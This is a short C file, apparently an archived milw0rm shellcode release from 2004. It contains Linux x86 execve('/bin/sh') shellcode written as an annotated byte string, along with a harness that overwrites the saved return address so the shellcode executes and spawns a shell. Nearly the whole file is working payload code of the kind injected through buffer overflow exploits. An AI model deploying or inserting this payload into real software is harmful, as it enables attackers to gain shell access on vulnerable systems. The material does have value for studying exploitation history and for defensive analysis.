/*
 * s0t4ipv6@Shellcode.com.ar
 * execve /bin/sh
 *
 * main() {
 *  char *name[2];
 *  name[0]="/bin/sh";
 *  name[1]=NULL;
 *  execve(name[0],name,NULL);
 * }
*/

#include <stdio.h>

char shellcode[]=
"\xeb\x18"		//	jmp	0x18		// 3-4
"\x5e"			//	popl	%esi		// 5
"\x89\x76\x08"		//	movl	%esi, 0x8(%esi)	// 6-8
"\x31\xc0"		//	xorl	%eax, %eax	// 9-10
"\x88\x46\x07"		//	movb	%al, 0x7(%esi)  // 11-13
"\x89\x46\x0c"		//	movl	%eax, 0xc(%esi)	// 14-16
"\x89\xf3"		//	movl	%esi, %ebx	// 17-18
"\x8d\x4e\x08"		//	leal	0x8(%esi), %ecx	// 19-21
"\x8d\x56\x0c"		//	leal	0xc(%esi), %edx	// 22-24
"\xb0\x0b"		//	movb	$0xb, %al	// 25-20 0xb to eax (syscall execve)6
"\xcd\x80"		//	int	$0x80		// 27-28
"\xe8\xe3\xff\xff\xff"	//	call	-0x1d
"/bin/sh";

main() {
	int *ret;
	ret=(int *)&ret +2;
	printf("Shellcode lenght=%d\n",strlen(shellcode));
	(*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-12]